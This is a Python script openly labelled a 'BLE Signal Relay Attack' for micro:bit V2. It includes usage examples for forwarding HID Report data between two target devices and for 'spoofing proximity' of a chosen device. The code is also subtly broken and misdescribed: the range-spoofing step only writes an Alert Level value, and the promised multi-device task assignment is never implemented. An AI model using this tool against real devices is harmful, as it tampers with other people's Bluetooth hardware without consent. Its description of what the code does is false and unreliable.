# microbit_ble_signal_relay.py

"""
BLE Signal Relay Attack for micro:bit V2 (Multi-Device Support)

This script enables BLE signal relaying to extend or manipulate the range of BLE devices.
- Detects available micro:bit devices and assigns tasks dynamically
- Relays BLE signals between two locations (`--relay <source_mac> <target_mac>`)
- Manipulates RSSI and transmission power to fake proximity (`--spoof-range <mac>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Relay BLE signals between two devices:
   ```sh
   python microbit_ble_signal_relay.py --relay AA:BB:CC:DD:EE:FF BB:CC:DD:EE:FF:AA
   ```

2. Spoof proximity of a BLE device:
   ```sh
   python microbit_ble_signal_relay.py --spoof-range AA:BB:CC:DD:EE:FF
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakScanner, BleakClient
import argparse

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# BLE Signal Relay
async def ble_signal_relay(source_mac, target_mac):
    """Relays BLE signals between two devices."""
    print(f"[+] Relaying BLE signals from {source_mac} to {target_mac}...")
    async with BleakClient(source_mac) as source_client:
        async with BleakClient(target_mac) as target_client:
            while True:
                data = await source_client.read_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb")
                await target_client.write_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb", data)
                print(f"[+] Relayed data: {data}")
                await asyncio.sleep(0.5)

# BLE Range Spoofing
async def ble_spoof_range(target_mac):
    """Manipulates RSSI and transmission power to fake proximity."""
    print(f"[+] Spoofing BLE range for {target_mac}...")
    async with BleakClient(target_mac) as client:
        await client.write_gatt_char("00002a06-0000-1000-8000-00805f9b34fb", b'\x02')
        print("[+] Range spoofed: Device appears closer than it is.")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Signal Relay Attack for micro:bit V2")
    parser.add_argument("--relay", nargs=2, metavar=("source_mac", "target_mac"), help="Relay BLE signals between two devices")
    parser.add_argument("--spoof-range", help="Spoof BLE proximity by modifying signal strength", metavar="target_mac")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.relay:
        loop.run_until_complete(ble_signal_relay(args.relay[0], args.relay[1]))
    elif args.spoof_range:
        loop.run_until_complete(ble_spoof_range(args.spoof_range))
